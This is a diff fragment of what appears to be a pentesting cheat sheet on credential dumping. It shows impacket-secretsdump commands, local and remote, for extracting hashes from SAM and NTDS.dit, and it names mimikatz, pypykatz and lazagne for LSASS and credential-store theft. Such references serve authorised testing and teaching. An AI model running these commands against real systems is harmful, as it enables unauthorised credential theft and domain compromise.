@@ -5,7 +5,7 @@ Quick Reference
 impacket-secretsdump -sam <SAM> -system <SYSTEM> -security <SECURITY> -ntds <NTDS.dit> LOCAL
 
 # Remotely
-impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY -ntds NTDS -dc-ip <dc_ip> '<domain>'/'<username>':'<password>'@<target>
+impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY -ntds NTDS -dc-ip <dc_ip> '<domain>'/'<username>':'<password>'@<target> [use-ntds]
 
 # LSASS -- mimikatz or pypykatz
 # Windows Credential Manager -- mimikatz or lazagne
